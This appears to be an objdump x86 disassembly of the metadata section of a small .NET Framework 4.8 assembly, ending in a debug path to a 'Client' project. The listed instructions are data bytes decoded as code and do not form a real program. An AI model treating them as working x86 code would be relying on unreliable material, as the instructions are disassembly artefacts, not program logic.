  4079f2:	02 05 20 02 01 1c    	add    0x1c010220,%al
  4079f8:	18 0a                	sbb    %cl,(%edx)
  4079fa:	20 03                	and    %al,(%ebx)
  4079fc:	01 12                	add    %edx,(%edx)
  4079fe:	81 55 02 12 81 51 05 	adcl   $0x5518112,0x2(%ebp)
  407a05:	20 00                	and    %al,(%eax)
  407a07:	12 81 59 03 20 00    	adc    0x200359(%ecx),%al
  407a0d:	0e                   	push   %cs
  407a0e:	0b 20                	or     (%eax),%esp
  407a10:	04 01                	add    $0x1,%al
  407a12:	0e                   	push   %cs
  407a13:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  407a19:	02 09                	add    (%ecx),%cl
  407a1b:	20 04 01             	and    %al,(%ecx,%eax,1)
  407a1e:	12 81 69 1c 08 08    	adc    0x8081c69(%ecx),%al
  407a24:	0c 20                	or     $0x20,%al
  407a26:	05 12 7d 1d 05       	add    $0x51d7d12,%eax
  407a2b:	08 08                	or     %cl,(%eax)
  407a2d:	12 81 6d 1c 06 00    	adc    0x61c6d(%ecx),%al
  407a33:	01 11                	add    %edx,(%ecx)
  407a35:	81 75 0e 10 07 0c 08 	xorl   $0x80c0710,0xe(%ebp)
  407a3c:	02 02                	add    (%edx),%al
  407a3e:	02 0a                	add    (%edx),%cl
  407a40:	02 12                	add    (%edx),%dl
  407a42:	80 81 08 02 02 02 02 	addb   $0x2,0x2020208(%ecx)
  407a49:	05 20 01 08 12       	add    $0x12080120,%eax
  407a4e:	7d 06                	jge    0x407a56
  407a50:	00 02                	add    %al,(%edx)
  407a52:	08 1d 05 08 06 00    	or     %bl,0x60805
  407a58:	03 0e                	add    (%esi),%ecx
  407a5a:	0e                   	push   %cs
  407a5b:	0e                   	push   %cs
  407a5c:	0e                   	push   %cs
  407a5d:	07                   	pop    %es
  407a5e:	20 03                	and    %al,(%ebx)
  407a60:	08 1d 05 08 08 06    	or     %bl,0x6080805
  407a66:	20 01                	and    %al,(%ecx)
  407a68:	01 12                	add    %edx,(%edx)
  407a6a:	81 81 04 20 01 01 1c 	addl   $0x9070f1c,0x1012004(%ecx)
  407a71:	0f 07 09 
  407a74:	1c 02                	sbb    $0x2,%al
  407a76:	1d 05 02 02 12       	sbb    $0x12020205,%eax
  407a7b:	80 85 08 1d 05 02 06 	addb   $0x6,0x2051d08(%ebp)
  407a82:	00 02                	add    %al,(%edx)
  407a84:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  407a87:	02 05 00 01 1d 05    	add    0x51d0100,%al
  407a8d:	08 07                	or     %al,(%edi)
  407a8f:	20 02                	and    %al,(%edx)
  407a91:	02 08                	add    (%eax),%cl
  407a93:	11 81 89 07 20 03    	adc    %eax,0x3200789(%ecx)
  407a99:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  407a9f:	20 01                	and    %al,(%ecx)
  407aa1:	01 1d 05 04 20 01    	add    %ebx,0x1200405
  407aa7:	01 0a                	add    %ecx,(%edx)
  407aa9:	04 00                	add    $0x0,%al
  407aab:	01 01                	add    %eax,(%ecx)
  407aad:	1c 05                	sbb    $0x5,%al
  407aaf:	07                   	pop    %es
  407ab0:	01 12                	add    %edx,(%edx)
  407ab2:	80 89 06 20 01 12 80 	orb    $0x80,0x12012006(%ecx)
  407ab9:	89 0e                	mov    %ecx,(%esi)
  407abb:	04 20                	add    $0x20,%al
  407abd:	00 1d 05 03 00 00    	add    %bl,0x305
  407ac3:	01 23                	add    %esp,(%ebx)
  407ac5:	07                   	pop    %es
  407ac6:	10 12                	adc    %dl,(%edx)
  407ac8:	80 8d 0e 02 12 80 91 	orb    $0x91,-0x7fedfdf2(%ebp)
  407acf:	1d 05 0e 1d 12       	sbb    $0x121d0e05,%eax
  407ad4:	80 95 08 12 80 95 02 	adcb   $0x2,-0x6a7fedf8(%ebp)
  407adb:	02 12                	add    (%edx),%dl
  407add:	80 99 12 80 9d 02 12 	sbbb   $0x12,0x29d8012(%ecx)
  407ae4:	80 a1 12 49 05 00 02 	andb   $0x2,0x54912(%ecx)
  407aeb:	0e                   	push   %cs
  407aec:	0e                   	push   %cs
  407aed:	0e                   	push   %cs
  407aee:	05 00 00 12 80       	add    $0x80120000,%eax
  407af3:	95                   	xchg   %eax,%ebp
  407af4:	05 20 00 12 81       	add    $0x81120020,%eax
  407af9:	95                   	xchg   %eax,%ebp
  407afa:	06                   	push   %es
  407afb:	00 00                	add    %al,(%eax)
  407afd:	1d 12 80 95 05       	sbb    $0x5958012,%eax
  407b02:	00 01                	add    %al,(%ecx)
  407b04:	0e                   	push   %cs
  407b05:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  407b0a:	01 11                	add    %edx,(%ecx)
  407b0c:	81 9d 08 00 01 12 80 	sbbl   $0x80129580,0x12010008(%ebp)
  407b13:	95 12 80 
  407b16:	99                   	cltd
  407b17:	04 06                	add    $0x6,%al
  407b19:	12 80 9d 09 20 02    	adc    0x220099d(%eax),%al
  407b1f:	12 80 9d 0e 11 81    	adc    -0x7eeef163(%eax),%al
  407b25:	a9 05 20 02 01       	test   $0x1022005,%eax
  407b2a:	0e                   	push   %cs
  407b2b:	1c 07                	sbb    $0x7,%al
  407b2d:	20 02                	and    %al,(%edx)
  407b2f:	01 0e                	add    %ecx,(%esi)
  407b31:	11 81 b1 03 00 00    	adc    %eax,0x3b1(%ecx)
  407b37:	0e                   	push   %cs
  407b38:	05 07 03 0a 02       	add    $0x20a0307,%eax
  407b3d:	02 03                	add    (%ebx),%al
  407b3f:	20 00                	and    %al,(%eax)
  407b41:	0a 04 07             	or     (%edi,%eax,1),%al
  407b44:	02 02                	add    (%edx),%al
  407b46:	02 04 20             	add    (%eax,%eiz,1),%al
  407b49:	01 02                	add    %eax,(%edx)
  407b4b:	0e                   	push   %cs
  407b4c:	11 07                	adc    %eax,(%edi)
  407b4e:	07                   	pop    %es
  407b4f:	12 80 a5 12 80 a9    	adc    -0x567fed5b(%eax),%al
  407b55:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407b5b:	0e                   	push   %cs
  407b5c:	02 02                	add    (%edx),%al
  407b5e:	05 20 00 12 80       	add    $0x80120020,%eax
  407b63:	a9 05 20 00 12       	test   $0x12002005,%eax
  407b68:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  407b6f:	b1 04                	mov    $0x4,%cl
  407b71:	20 01                	and    %al,(%ecx)
  407b73:	1c 0e                	sbb    $0xe,%al
  407b75:	03 20                	add    (%eax),%esp
  407b77:	00 18                	add    %bl,(%eax)
  407b79:	05 07 03 02 18       	add    $0x18020307,%eax
  407b7e:	02 03                	add    (%ebx),%al
  407b80:	20 00                	and    %al,(%eax)
  407b82:	08 03                	or     %al,(%ebx)
  407b84:	07                   	pop    %es
  407b85:	01 0e                	add    %ecx,(%esi)
  407b87:	03 00                	add    (%eax),%eax
  407b89:	00 08                	add    %cl,(%eax)
  407b8b:	05 00 00 12 81       	add    $0x81120000,%eax
  407b90:	c9                   	leave
  407b91:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  407b96:	1c 0f                	sbb    $0xf,%al
  407b98:	07                   	pop    %es
  407b99:	07                   	pop    %es
  407b9a:	12 80 b5 1d 05 12    	adc    0x12051db5(%eax),%al
  407ba0:	80 b9 1d 05 08 05 0e 	cmpb   $0xe,0x508051d(%ecx)
  407ba7:	06                   	push   %es
  407ba8:	20 01                	and    %al,(%ecx)
  407baa:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  407baf:	20 01                	and    %al,(%ecx)
  407bb1:	12 80 b9 0e 05 20    	adc    0x20050eb9(%eax),%al
  407bb7:	02 0e                	add    (%esi),%cl
  407bb9:	08 08                	or     %cl,(%eax)
  407bbb:	0b 07                	or     (%edi),%eax
  407bbd:	04 12                	add    $0x12,%al
  407bbf:	80 89 02 11 80 bd 1d 	orb    $0x1d,-0x427feefe(%ecx)
  407bc6:	05 05 20 02 0e       	add    $0xe022005,%eax
  407bcb:	0e                   	push   %cs
  407bcc:	0e                   	push   %cs
  407bcd:	03 00                	add    (%eax),%eax
  407bcf:	00 02                	add    %al,(%edx)
  407bd1:	05 20 00 11 80       	add    $0x80110020,%eax
  407bd6:	bd 05 00 00 12       	mov    $0x12000005,%ebp
  407bdb:	81 d9 06 20 01 01    	sbb    $0x1012006,%ecx
  407be1:	12 81 d9 06 20 01    	adc    0x12006d9(%ecx),%al
  407be7:	02 11                	add    (%ecx),%dl
  407be9:	81 e1 13 07 06 12    	and    $0x12060713,%ecx
  407bef:	80 a5 15 12 80 c1 01 	andb   $0x1,-0x3e7fedeb(%ebp)
  407bf6:	0e                   	push   %cs
  407bf7:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407bfd:	02 0e                	add    (%esi),%cl
  407bff:	06                   	push   %es
  407c00:	15 12 80 c1 01       	adc    $0x1c18012,%eax
  407c05:	0e                   	push   %cs
  407c06:	05 20 01 01 13       	add    $0x13010120,%eax
  407c0b:	00 05 20 00 1d 13    	add    %al,0x131d0020
  407c11:	00 06                	add    %al,(%esi)
  407c13:	00 02                	add    %al,(%edx)
  407c15:	0e                   	push   %cs
  407c16:	0e                   	push   %cs
  407c17:	1d 0e 12 07 06       	sbb    $0x607120e,%eax
  407c1c:	1d 12 80 c5 1d       	sbb    $0x1dc58012,%eax
  407c21:	12 80 c5 08 12 80    	adc    -0x7fedf73b(%eax),%al
  407c27:	c5 02                	lds    (%edx),%eax
  407c29:	12 80 c5 06 00 00    	adc    0x6c5(%eax),%al
  407c2f:	1d 12 80 c5 05       	sbb    $0x5c58012,%eax
  407c34:	20 00                	and    %al,(%eax)
  407c36:	11 81 e5 09 00 02    	adc    %eax,0x20009e5(%ecx)
  407c3c:	02 11                	add    (%ecx),%dl
  407c3e:	81 e5 11 81 e5 08    	and    $0x8e58111,%ebp
  407c44:	07                   	pop    %es
  407c45:	04 12                	add    $0x12,%al
  407c47:	80 b9 18 02 0e 02 06 	cmpb   $0x6,0x20e0218(%ecx)
  407c4e:	08 07                	or     %al,(%edi)
  407c50:	20 03                	and    %al,(%ebx)
  407c52:	01 02                	add    %eax,(%edx)
  407c54:	0e                   	push   %cs
  407c55:	10 02                	adc    %al,(%edx)
  407c57:	06                   	push   %es
  407c58:	00 01                	add    %al,(%ecx)
  407c5a:	01 12                	add    %edx,(%edx)
  407c5c:	81 ed 08 07 03 12    	sub    $0x12030708,%ebp
  407c62:	80 9d 02 12 49 08 20 	sbbb   $0x20,0x8491202(%ebp)
  407c69:	03 01                	add    (%ecx),%eax
  407c6b:	0e                   	push   %cs
  407c6c:	1c 11                	sbb    $0x11,%al
  407c6e:	81 f5 0a 07 04 12    	xor    $0x1204070a,%ebp
  407c74:	80 9d 1c 1d 05 12 49 	sbbb   $0x49,0x12051d1c(%ebp)
  407c7b:	06                   	push   %es
  407c7c:	20 01                	and    %al,(%ecx)
  407c7e:	12 80 9d 0e 02 1d    	adc    0x1d020e9d(%eax),%al
  407c84:	05 07 20 02 12       	add    $0x12022007,%eax
  407c89:	80 9d 0e 02 1e 07 0b 	sbbb   $0xb,0x71e020e(%ebp)
  407c90:	12 80 89 0e 0e 12    	adc    0x120e0e89(%eax),%al
  407c96:	80 89 02 12 80 89 12 	orb    $0x12,-0x767fedfe(%ecx)
  407c9d:	49                   	dec    %ecx
  407c9e:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407ca3:	12 80 89 12 80 89    	adc    -0x767fed77(%eax),%al
  407ca9:	02 12                	add    (%edx),%dl
  407cab:	49                   	dec    %ecx
  407cac:	08 15 12 80 c1 01    	or     %dl,0x1c18012
  407cb2:	12 80 89 11 10 01    	adc    0x1101189(%eax),%al
  407cb8:	01 15 12 80 c1 01    	add    %edx,0x1c18012
  407cbe:	1e                   	push   %ds
  407cbf:	00 15 12 81 fd 01    	add    %dl,0x1fd8112
  407cc5:	1e                   	push   %ds
  407cc6:	00 05 0a 01 12 80    	add    %al,0x8012010a
  407ccc:	89 09                	mov    %ecx,(%ecx)
  407cce:	20 00                	and    %al,(%eax)
  407cd0:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407cd5:	13 00                	adc    (%eax),%eax
  407cd7:	08 15 11 80 d9 01    	or     %dl,0x1d98011
  407cdd:	12 80 89 04 20 00    	adc    0x200489(%eax),%al
  407ce3:	13 00                	adc    (%eax),%eax
  407ce5:	05 20 01 02 13       	add    $0x13020120,%eax
  407cea:	00 09                	add    %cl,(%ecx)
  407cec:	07                   	pop    %es
  407ced:	03 12                	add    (%edx),%edx
  407cef:	80 dd 12             	sbb    $0x12,%ch
  407cf2:	80 e1 1c             	and    $0x1c,%cl
  407cf5:	05 00 00 12 82       	add    $0x82120000,%eax
  407cfa:	01 06                	add    %eax,(%esi)
  407cfc:	00 01                	add    %al,(%ecx)
  407cfe:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  407d03:	20 01                	and    %al,(%ecx)
  407d05:	12 80 dd 1d 05 06    	adc    0x6051ddd(%eax),%al
  407d0b:	20 01                	and    %al,(%ecx)
  407d0d:	12 80 e1 0e 06 00    	adc    0x60ee1(%eax),%al
  407d13:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407d16:	80 e1 08             	and    $0x8,%cl
  407d19:	00 01                	add    %al,(%ecx)
  407d1b:	12 80 e1 11 82 0d    	adc    0xd8211e1(%eax),%al
  407d21:	09 00                	or     %eax,(%eax)
  407d23:	02 12                	add    (%edx),%dl
  407d25:	82 11 11             	adcb   $0x11,(%ecx)
  407d28:	82 15 0e 1c 00 05 12 	adcb   $0x12,0x5001c0e
  407d2f:	82 1d 11 82 21 0e 15 	sbbb   $0x15,0xe218211
  407d36:	12 81 fd 01 12 80    	adc    -0x7fedfe03(%ecx),%al
  407d3c:	e1 12                	loope  0x407d50
  407d3e:	80 e1 15             	and    $0x15,%cl
  407d41:	12 81 fd 01 12 82    	adc    -0x7dedfe03(%ecx),%al
  407d47:	11 1b                	adc    %ebx,(%ebx)
  407d49:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407d4e:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407d53:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407d59:	12 41 0e             	adc    0xe(%ecx),%al
  407d5c:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407d61:	0e                   	push   %cs
  407d62:	0e                   	push   %cs
  407d63:	0e                   	push   %cs
  407d64:	0c 00                	or     $0x0,%al
  407d66:	01 15 12 80 e5 01    	add    %edx,0x1e58012
  407d6c:	13 00                	adc    (%eax),%eax
  407d6e:	12 82 1d 03 06 13    	adc    0x1306031d(%edx),%al
  407d74:	00 16                	add    %dl,(%esi)
  407d76:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407d7b:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407d81:	12 41 0e             	adc    0xe(%ecx),%al
  407d84:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407d89:	0e                   	push   %cs
  407d8a:	0e                   	push   %cs
  407d8b:	0e                   	push   %cs
  407d8c:	17                   	pop    %ss
  407d8d:	20 0a                	and    %cl,(%edx)
  407d8f:	01 13                	add    %edx,(%ebx)
  407d91:	00 13                	add    %dl,(%ebx)
  407d93:	01 13                	add    %edx,(%ebx)
  407d95:	02 13                	add    (%ebx),%dl
  407d97:	03 13                	add    (%ebx),%edx
  407d99:	04 13                	add    $0x13,%al
  407d9b:	05 13 06 13 07       	add    $0x7130613,%eax
  407da0:	13 08                	adc    (%eax),%ecx
  407da2:	13 09                	adc    (%ecx),%ecx
  407da4:	06                   	push   %es
  407da5:	07                   	pop    %es
  407da6:	02 02                	add    (%edx),%al
  407da8:	12 80 f1 07 20 03    	adc    0x32007f1(%eax),%al
  407dae:	01 0e                	add    %ecx,(%esi)
  407db0:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  407db5:	01 1d 05 08 05 00    	add    %ebx,0x50805
  407dbb:	01 0e                	add    %ecx,(%esi)
  407dbd:	1d 05 13 07 07       	sbb    $0x7071305,%eax
  407dc2:	02 12                	add    (%edx),%dl
  407dc4:	80 85 12 80 f5 12 80 	addb   $0x80,0x12f58012(%ebp)
  407dcb:	f9                   	stc
  407dcc:	12 80 fd 1d 05 1d    	adc    0x1d051dfd(%eax),%al
  407dd2:	05 06 20 01 01       	add    $0x1012006,%eax
  407dd7:	11 82 35 06 20 01    	adc    %eax,0x1200635(%edx)
  407ddd:	01 11                	add    %edx,(%ecx)
  407ddf:	82 39 05             	cmpb   $0x5,(%ecx)
  407de2:	20 00                	and    %al,(%eax)
  407de4:	12 82 3d 0c 20 03    	adc    0x3200c3d(%edx),%al
  407dea:	01 12                	add    %edx,(%edx)
  407dec:	81 55 12 82 3d 11 82 	adcl   $0x82113d82,0x12(%ebp)
  407df3:	41                   	inc    %ecx
  407df4:	08 20                	or     %ah,(%eax)
  407df6:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  407dfc:	08 05 20 01 0e 1d    	or     %al,0x1d0e0120
  407e02:	05 1c 07 0c 02       	add    $0x20c071c,%eax
  407e07:	12 80 85 12 80 f5    	adc    -0xa7fed7b(%eax),%al
  407e0d:	1d 05 12 80 fd       	sbb    $0xfd801205,%eax
  407e12:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  407e17:	12 80 f9 1d 05 1d    	adc    0x1d051df9(%eax),%al
  407e1d:	05 1d 05 0c 00       	add    $0xc051d,%eax
  407e22:	05 01 12 82 4d       	add    $0x4d821201,%eax
  407e27:	08 12                	or     %dl,(%edx)
  407e29:	82 4d 08 08          	orb    $0x8,0x8(%ebp)
  407e2d:	07                   	pop    %es
  407e2e:	07                   	pop    %es
  407e2f:	05 02 08 02 02       	add    $0x2020802,%eax
  407e34:	02 09                	add    (%ecx),%cl
  407e36:	00 02                	add    %al,(%edx)
  407e38:	01 12                	add    %edx,(%edx)
  407e3a:	82 4d 11 82          	orb    $0x82,0x11(%ebp)
  407e3e:	55                   	push   %ebp
  407e3f:	0f 07                	sysret
  407e41:	07                   	pop    %es
  407e42:	1d 05 12 80 b9       	sbb    $0xb9801205,%eax
  407e47:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407e4d:	05 0e 07 07 02       	add    $0x207070e,%eax
  407e52:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407e58:	b7 7a                	mov    $0x7a,%bh
  407e5a:	5c                   	pop    %esp
  407e5b:	56                   	push   %esi
  407e5c:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  407e5f:	89 08                	mov    %ecx,(%eax)
  407e61:	b0 3f                	mov    $0x3f,%al
  407e63:	5f                   	pop    %edi
  407e64:	7f 11                	jg     0x407e77
  407e66:	d5 0a                	aad    $0xa
  407e68:	3a 04 20             	cmp    (%eax,%eiz,1),%al
  407e6b:	00 00                	add    %al,(%eax)
  407e6d:	00 04 40             	add    %al,(%eax,%eax,2)
  407e70:	00 00                	add    %al,(%eax)
  407e72:	00 04 10             	add    %al,(%eax,%edx,1)
  407e75:	00 00                	add    %al,(%eax)
  407e77:	00 04 00             	add    %al,(%eax,%eax,1)
  407e7a:	00 00                	add    %al,(%eax)
  407e7c:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  407e80:	00 00                	add    %al,(%eax)
  407e82:	04 01                	add    $0x1,%al
  407e84:	00 00                	add    %al,(%eax)
  407e86:	00 02                	add    %al,(%edx)
  407e88:	06                   	push   %es
  407e89:	0e                   	push   %cs
  407e8a:	03 06                	add    (%esi),%eax
  407e8c:	12 41 03             	adc    0x3(%ecx),%al
  407e8f:	06                   	push   %es
  407e90:	12 3c 03             	adc    (%ebx,%eax,1),%bh
  407e93:	06                   	push   %es
  407e94:	12 59 03             	adc    0x3(%ecx),%bl
  407e97:	06                   	push   %es
  407e98:	12 5d 03             	adc    0x3(%ebp),%bl
  407e9b:	06                   	push   %es
  407e9c:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  407ea1:	03 06                	add    (%esi),%eax
  407ea3:	12 61 02             	adc    0x2(%ecx),%ah
  407ea6:	06                   	push   %es
  407ea7:	02 02                	add    (%edx),%al
  407ea9:	06                   	push   %es
  407eaa:	1c 04                	sbb    $0x4,%al
  407eac:	06                   	push   %es
  407ead:	12 80 cd 09 06 15    	adc    0x150609cd(%eax),%al
  407eb3:	12 80 c1 01 12 80    	adc    -0x7fedfe3f(%eax),%al
  407eb9:	89 03                	mov    %eax,(%ebx)
  407ebb:	06                   	push   %es
  407ebc:	11 50 02             	adc    %edx,0x2(%eax)
  407ebf:	06                   	push   %es
  407ec0:	09 03                	or     %eax,(%ebx)
  407ec2:	06                   	push   %es
  407ec3:	11 48 1c             	adc    %ecx,0x1c(%eax)
  407ec6:	06                   	push   %es
  407ec7:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407ecc:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407ed1:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407ed7:	12 41 0e             	adc    0xe(%ecx),%al
  407eda:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407edf:	0e                   	push   %cs
  407ee0:	0e                   	push   %cs
  407ee1:	0e                   	push   %cs
  407ee2:	04 00                	add    $0x0,%al
  407ee4:	00 12                	add    %dl,(%edx)
  407ee6:	59                   	pop    %ecx
  407ee7:	05 00 01 01 12       	add    $0x12010100,%eax
  407eec:	59                   	pop    %ecx
  407eed:	04 00                	add    $0x0,%al
  407eef:	00 12                	add    %dl,(%edx)
  407ef1:	5d                   	pop    %ebp
  407ef2:	05 00 01 01 12       	add    $0x12010100,%eax
  407ef7:	5d                   	pop    %ebp
  407ef8:	04 00                	add    $0x0,%al
  407efa:	00 1d 05 05 00 01    	add    %bl,0x1000505
  407f00:	01 1d 05 03 00 00    	add    %ebx,0x305
  407f06:	0a 04 00             	or     (%eax,%eax,1),%al
  407f09:	01 01                	add    %eax,(%ecx)
  407f0b:	0a 04 00             	or     (%eax,%eax,1),%al
  407f0e:	00 12                	add    %dl,(%edx)
  407f10:	61                   	popa
  407f11:	05 00 01 01 12       	add    $0x12010100,%eax
  407f16:	61                   	popa
  407f17:	04 00                	add    $0x0,%al
  407f19:	01 01                	add    %eax,(%ecx)
  407f1b:	02 03                	add    (%ebx),%al
  407f1d:	00 00                	add    %al,(%eax)
  407f1f:	1c 0a                	sbb    $0xa,%al
  407f21:	00 04 02             	add    %al,(%edx,%eax,1)
  407f24:	1c 12                	sbb    $0x12,%al
  407f26:	71 12                	jno    0x407f3a
  407f28:	75 11                	jne    0x407f3b
  407f2a:	79 05                	jns    0x407f31
  407f2c:	00 01                	add    %al,(%ecx)
  407f2e:	01 12                	add    %edx,(%edx)
  407f30:	7d 08                	jge    0x407f3a
  407f32:	00 01                	add    %al,(%ecx)
  407f34:	12 80 c5 12 80 c9    	adc    -0x367fed3b(%eax),%al
  407f3a:	03 00                	add    (%eax),%eax
  407f3c:	00 18                	add    %bl,(%eax)
  407f3e:	08 00                	or     %al,(%eax)
  407f40:	03 08                	add    (%eax),%ecx
  407f42:	18 12                	sbb    %dl,(%edx)
  407f44:	80 b9 08 04 00 01 18 	cmpb   $0x18,0x1000408(%ecx)
  407f4b:	0e                   	push   %cs
  407f4c:	06                   	push   %es
  407f4d:	00 02                	add    %al,(%edx)
  407f4f:	02 18                	add    (%eax),%bl
  407f51:	10 02                	adc    %al,(%edx)
  407f53:	06                   	push   %es
  407f54:	00 01                	add    %al,(%ecx)
  407f56:	11 48 11             	adc    %ecx,0x11(%eax)
  407f59:	48                   	dec    %eax
  407f5a:	06                   	push   %es
  407f5b:	00 03                	add    %al,(%ebx)
  407f5d:	01 09                	add    %ecx,(%ecx)
  407f5f:	09 09                	or     %ecx,(%ecx)
  407f61:	07                   	pop    %es
  407f62:	00 02                	add    %al,(%edx)
  407f64:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407f67:	80 d5 06             	adc    $0x6,%ch
  407f6a:	00 02                	add    %al,(%edx)
  407f6c:	02 0e                	add    (%esi),%cl
  407f6e:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  407f73:	01 12                	add    %edx,(%edx)
  407f75:	80 89 07 20 02 02 1d 	orb    $0x1d,0x2022007(%ecx)
  407f7c:	05 1d 05 04 08       	add    $0x804051d,%eax
  407f81:	00 12                	add    %dl,(%edx)
  407f83:	59                   	pop    %ecx
  407f84:	04 08                	add    $0x8,%al
  407f86:	00 12                	add    %dl,(%edx)
  407f88:	5d                   	pop    %ebp
  407f89:	04 08                	add    $0x8,%al
  407f8b:	00 1d 05 03 08 00    	add    %bl,0x80305
  407f91:	0a 04 08             	or     (%eax,%ecx,1),%al
  407f94:	00 12                	add    %dl,(%edx)
  407f96:	61                   	popa
  407f97:	03 08                	add    (%eax),%ecx
  407f99:	00 02                	add    %al,(%edx)
  407f9b:	03 08                	add    (%eax),%ecx
  407f9d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  407fa0:	08 00                	or     %al,(%eax)
  407fa2:	08 08                	or     %cl,(%eax)
  407fa4:	01 00                	add    %eax,(%eax)
  407fa6:	08 00                	or     %al,(%eax)
  407fa8:	00 00                	add    %al,(%eax)
  407faa:	00 00                	add    %al,(%eax)
  407fac:	1e                   	push   %ds
  407fad:	01 00                	add    %eax,(%eax)
  407faf:	01 00                	add    %eax,(%eax)
  407fb1:	54                   	push   %esp
  407fb2:	02 16                	add    (%esi),%dl
  407fb4:	57                   	push   %edi
  407fb5:	72 61                	jb     0x408018
  407fb7:	70 4e                	jo     0x408007
  407fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  407fba:	6e                   	outsb  %ds:(%esi),(%dx)
  407fbb:	45                   	inc    %ebp
  407fbc:	78 63                	js     0x408021
  407fbe:	65 70 74             	gs jo  0x408035
  407fc1:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  407fc8:	77 73                	ja     0x40803d
  407fca:	01 08                	add    %ecx,(%eax)
  407fcc:	01 00                	add    %eax,(%eax)
  407fce:	07                   	pop    %es
  407fcf:	01 00                	add    %eax,(%eax)
  407fd1:	00 00                	add    %al,(%eax)
  407fd3:	00 05 01 00 00 00    	add    %al,0x1
  407fd9:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  407fdc:	00 07                	add    %al,(%edi)
  407fde:	31 2e                	xor    %ebp,(%esi)
  407fe0:	30 2e                	xor    %ch,(%esi)
  407fe2:	30 2e                	xor    %ch,(%esi)
  407fe4:	30 00                	xor    %al,(%eax)
  407fe6:	00 49 01             	add    %cl,0x1(%ecx)
  407fe9:	00 1a                	add    %bl,(%edx)
  407feb:	2e 4e                	cs dec %esi
  407fed:	45                   	inc    %ebp
  407fee:	54                   	push   %esp
  407fef:	46                   	inc    %esi
  407ff0:	72 61                	jb     0x408053
  407ff2:	6d                   	insl   (%dx),%es:(%edi)
  407ff3:	65 77 6f             	gs ja  0x408065
  407ff6:	72 6b                	jb     0x408063
  407ff8:	2c 56                	sub    $0x56,%al
  407ffa:	65 72 73             	gs jb  0x408070
  407ffd:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  408004:	38 01                	cmp    %al,(%ecx)
  408006:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40800a:	46                   	inc    %esi
  40800b:	72 61                	jb     0x40806e
  40800d:	6d                   	insl   (%dx),%es:(%edi)
  40800e:	65 77 6f             	gs ja  0x408080
  408011:	72 6b                	jb     0x40807e
  408013:	44                   	inc    %esp
  408014:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40801b:	61                   	popa
  40801c:	6d                   	insl   (%dx),%es:(%edi)
  40801d:	65 12 2e             	adc    %gs:(%esi),%ch
  408020:	4e                   	dec    %esi
  408021:	45                   	inc    %ebp
  408022:	54                   	push   %esp
  408023:	20 46 72             	and    %al,0x72(%esi)
  408026:	61                   	popa
  408027:	6d                   	insl   (%dx),%es:(%edi)
  408028:	65 77 6f             	gs ja  0x40809a
  40802b:	72 6b                	jb     0x408098
  40802d:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  408030:	38 08                	cmp    %cl,(%eax)
  408032:	01 00                	add    %eax,(%eax)
	...
  408040:	18 8b d0 e4 00 00    	sbb    %cl,0xe4d0(%ebx)
  408046:	00 00                	add    %al,(%eax)
  408048:	02 00                	add    (%eax),%al
  40804a:	00 00                	add    %al,(%eax)
  40804c:	3d 00 00 00 74       	cmp    $0x74000000,%eax
  408051:	80 00 00             	addb   $0x0,(%eax)
  408054:	74 62                	je     0x4080b8
	...
  408062:	00 00                	add    %al,(%eax)
  408064:	10 00                	adc    %al,(%eax)
	...
  408072:	00 00                	add    %al,(%eax)
  408074:	52                   	push   %edx
  408075:	53                   	push   %ebx
  408076:	44                   	inc    %esp
  408077:	53                   	push   %ebx
  408078:	d9 9d d3 18 11 42    	fstps  0x421118d3(%ebp)
  40807e:	7b 4d                	jnp    0x4080cd
  408080:	bd 34 7b 5b 64       	mov    $0x645b7b34,%ebp
  408085:	0b d7                	or     %edi,%edx
  408087:	ba 01 00 00 00       	mov    $0x1,%edx
  40808c:	43                   	inc    %ebx
  40808d:	3a 5c 6e 65          	cmp    0x65(%esi,%ebp,2),%bl
  408091:	77 5c                	ja     0x4080ef
  408093:	43                   	inc    %ebx
  408094:	6c                   	insb   (%dx),%es:(%edi)
  408095:	69 65 6e 74 5c 6f 62 	imul   $0x626f5c74,0x6e(%ebp),%esp
  40809c:	6a 5c                	push   $0x5c
  40809e:	44                   	inc    %esp
  40809f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4080a3:	5c                   	pop    %esp
